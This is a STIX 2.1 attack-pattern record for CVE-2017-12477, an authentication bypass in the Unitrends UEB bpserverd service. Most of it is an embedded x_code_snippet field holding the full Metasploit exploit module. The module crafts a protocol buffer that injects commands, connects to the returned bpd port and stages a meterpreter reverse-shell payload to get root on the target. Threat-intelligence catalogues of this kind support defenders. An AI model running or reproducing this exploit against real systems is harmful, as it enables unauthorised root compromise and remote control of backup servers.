{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90e23373-65f6-4d00-915b-f631b1457d34",
    "created": "2024-08-14T16:57:14.62122Z",
    "modified": "2024-08-14T16:57:14.621224Z",
    "name": "Unitrends UEB bpserverd authentication bypass RCE",
    "description": " It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd has an issue in which its authentication can be bypassed.  A remote attacker could use this issue to execute arbitrary commands with root privilege on the target system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/ueb9_bpserverd.rb",
            "external_id": "ueb9_bpserverd.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000CcZeAAK/000005755"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-12477"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-12477"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Unitrends UEB bpserverd authentication bypass RCE',\n      'Description'    => %q{\n       It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd,\n       has an issue in which its authentication can be bypassed.  A remote attacker could use this\n       issue to execute arbitrary commands with root privilege on the target system.\n      },\n      'Author'         =>\n        [\n          'Jared Arave',  # @iotennui\n          'Cale Smith',   # @0xC413\n          'Benny Husted'  # @BennyHusted\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch' => [ARCH_X86],\n      'CmdStagerFlavor' => [ 'printf' ],\n      'References'     =>\n        [\n          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000CcZeAAK/000005755'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2017-12477'],\n          ['CVE', '2017-12477'],\n        ],\n      'Targets'        =>\n        [\n          [ 'UEB 9.*', { } ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',\n          'SSL' => false\n        },\n      'DisclosureDate'  => '2017-08-08',\n      'DefaultTarget'   => 0))\n    register_options([\n        Opt::RPORT(1743)\n      ])\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    s1 = connect(global = false)\n    buf1  = s1.get_once(-1).to_s\n    #parse out the bpd port returned\n    bpd_port = buf1[-8..-3].to_i\n\n    #check if it's a valid port number (1-65534)\n    if bpd_port && bpd_port >= 1 && bpd_port <= 65535\n      Exploit::CheckCode::Detected\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n\n    #append a comment, ignore everything after our cmd\n    cmd = cmd + \" #\"\n\n    # build the attack buffer...\n    command_len = cmd.length + 3\n    packet_len = cmd.length + 23\n    data =  \"\\xa5\\x52\\x00\\x2d\"\n    data << \"\\x00\\x00\\x00\"\n    data << packet_len\n    data << \"\\x00\\x00\\x00\"\n    data << \"\\x01\"\n    data << \"\\x00\\x00\\x00\"\n    data << \"\\x4c\"\n    data << \"\\x00\\x00\\x00\"\n    data << command_len\n    data << cmd\n    data << \"\\x00\\x00\\x00\"\n\n    begin\n      print_status(\"Connecting to xinetd for bpd port...\")\n      s1 = connect(global = false)\n      buf1  = s1.get_once(-1).to_s\n\n      #parse out the bpd port returned, we will connect back on this port to send our cmd\n      bpd_port = buf1[-8..-3].to_i\n\n      print_good(\"bpd port received: #{bpd_port}\")\n      vprint_status(\"Connecting to #{bpd_port}\")\n\n      s2 = connect(global = false, opts = {'RPORT'=>bpd_port})\n      vprint_good('Connected!')\n\n      print_status('Sending command buffer to xinetd')\n\n      s1.put(data)\n      s2.get_once(-1,1).to_s\n\n      disconnect(s1)\n      disconnect(s2)\n\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      fail_with(Failure::Unreachable, \"#{peer} - Connection to server failed\")\n    end\n\n  end\n\n  def exploit\n    print_status(\"#{peer} - pwn'ng ueb 9....\")\n    execute_cmdstager(:linemax => 200)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}